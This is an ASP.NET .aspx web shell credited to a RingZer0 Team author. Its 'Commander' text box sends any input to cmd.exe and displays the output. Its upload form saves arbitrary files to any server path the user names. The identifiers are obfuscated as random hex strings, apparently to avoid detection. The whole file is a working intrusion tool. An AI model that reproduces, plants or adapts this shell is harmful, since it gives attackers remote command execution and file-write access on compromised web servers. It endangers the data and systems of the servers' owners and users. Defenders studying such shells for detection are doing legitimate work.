<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e) {
}

void _a7dbc825b9c34731(string arg) {
 ProcessStartInfo _3fc3e7f1bff24b57 = new ProcessStartInfo();
 _3fc3e7f1bff24b57.FileName = "cmd.exe";
 _3fc3e7f1bff24b57.Arguments = "/c" + arg;
 _3fc3e7f1bff24b57.RedirectStandardOutput = true;
 _3fc3e7f1bff24b57.UseShellExecute = false;
 Process _190019cabf9370c4eab9c5 = Process.Start(_3fc3e7f1bff24b57);
 StreamReader _080765e145d229dc58ec9828b1 = _190019cabf9370c4eab9c5.StandardOutput;
 string _3adb56841ac680b78d = _080765e145d229dc58ec9828b1.ReadToEnd();
 _080765e145d229dc58ec9828b1.Close();
 _4e241b6c.Text = "<pre>" + _3adb56841ac680b78d + "</pre>";
}

void _bb95b4213b36fd95_Click(object sender, System.EventArgs e) {
 _a7dbc825b9c34731(_8dc4fb3fe3832425.Text);
}

void _5fa6d819eaa88f545f309b15b3dc5c_Click(object sender, System.EventArgs e) {
 if(_7f1ac1.HasFile)
  try {
   _7f1ac1.SaveAs(_0232b8c9c8a77279a1cc0d9bef47f0.Text + 
   _7f1ac1.FileName);
   _4e241b6c.Text = "File name: " +
   _7f1ac1.PostedFile.FileName + "<br>" +
   _7f1ac1.PostedFile.ContentLength + " kb<br>" +
   "Content type: " +
   _7f1ac1.PostedFile.ContentType;
  } catch (Exception ex) {
   _4e241b6c.Text = "ERROR: " + ex.Message.ToString();
  }
 else {
  _4e241b6c.Text = "File is missing.";
 }
}
</script>
<!DOCTYPE html>
<html>
 <head>
  <title>Mr.Un1k0d3r - RingZer0 Team</title>
 </head>
 <body>
  <form id="cmd" method="post" runat="server">
   <div style="background-color: #ddd; padding: 5px; border-radius: 5px; margin-bottom: 15px;">
    <asp:Label ID="_4e241b6c" runat="server">Output:</asp:Label>
   </div>
   <h3>Commander</h3>
   <asp:TextBox id="_8dc4fb3fe3832425" runat="server" Width="250px"></asp:TextBox>
   <asp:Button id="testing" runat="server" Text="Run" OnClick="_bb95b4213b36fd95_Click"></asp:Button><br />
   <hr />
   <h3>Upload form</h3>
   Path:
   <asp:TextBox id="_0232b8c9c8a77279a1cc0d9bef47f0" runat="server" Width="250px"></asp:TextBox><br />
   <asp:FileUpload ID="_7f1ac1" runat="server" />
   <asp:Button ID="_bfa05709a293ca" runat="server" OnClick="_5fa6d819eaa88f545f309b15b3dc5c_Click" Text="Upload File" /><br />
  </form>
 </body>
</html>
